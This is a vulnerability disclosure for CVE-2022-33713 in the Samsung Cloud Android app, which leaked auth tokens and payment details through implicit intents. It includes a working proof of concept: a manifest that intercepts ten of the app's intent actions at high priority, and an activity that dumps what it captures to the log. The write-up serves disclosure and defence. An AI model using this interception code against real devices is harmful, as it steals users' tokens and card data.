# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Cloud</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.scloud</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.06</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.07.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33713">CVE-2022-33713</a> (SVE-2022-0867)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$4300</td>
    </tr>
</table>

# Description

Oversecured found the use of implicit intents:
![](04%20رئيسية/Samsung%20Vulnerabilities/039.%20Samsung%20Cloud%20—%20Leakage%20of%20auth%20tokens,%20purchase%20history,%20and%20last%204%20numbers%20of%20credit%20card/Oversecured_report.png)

These intents could have been intercepted by apps installed on the same device. The point is that some of them contained access tokens or payment information, such as credit card details.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_PURCHASE_DETAIL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_VERIFICATION_BY_EMAIL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_BILLING_UPGRADE_PLAN" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_THUMBNAIL_DETAIL_VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_DASHBOARD_DELETE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_VERIFICATION_BY_NOTI" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_AUTH_REQUEST_TRANSPARENT_VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_DETAIL_SYNC_SETTING" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.scloud.app.activity.LAUNCH_VERIFICATION_MAIN" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.msc.action.samsungaccount.mybenefitwebview" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    dump(getIntent(), getClassLoader());
    finish();
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
